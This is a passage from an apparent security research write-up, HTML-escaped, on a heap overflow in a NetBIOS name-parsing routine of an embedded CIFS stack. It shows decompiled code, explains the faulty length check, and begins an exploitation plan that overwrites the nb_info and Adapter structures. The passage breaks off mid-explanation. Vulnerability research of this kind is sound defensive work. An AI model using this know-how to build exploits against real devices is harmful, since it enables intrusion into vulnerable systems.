  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;238&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; does not calculate the length of the domain name correctly. It will copy the domain name to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buff&lt;/code&gt;, which leads to a heap overflow.&lt;/p&gt;

&lt;p&gt;Let’s take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; function.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-24h] BYREF&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resolveLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;maxlan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// ---------- [2]              // it does not subtract the length of &quot;.&quot;&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;634&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;595&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; will parse the domain from the label in the NetBIOS packet to the domain_name buffer and it has a verification. The verification will check that the total length of the label could not larger than maxlen, and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;.&quot;&lt;/code&gt; will be added between each label. But it does not subtract the length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;.&quot;&lt;/code&gt; characters so that the total length of the label can be larger than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxlen&lt;/code&gt;. It will lead to overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Luckily, there is a useful structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; to achieve our goal.  We can use the heap overflow to overwrite the structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The layout of heap memory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The structure is used to store NetBIOS name information, it also has a member &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt; to store the information of connection.&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Adapter&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1023&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recv_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword3C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s back to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt;, if the flag of NetBIOS-NS packet is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xA801&lt;/code&gt;, it will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndInternalNameNegativeRegistration&lt;/code&gt; to process our NetBIOS name. The result will be written to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter-&amp;gt;responsebuf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndInternalNameNegativeRegistration&lt;/code&gt; :&lt;/p&gt;

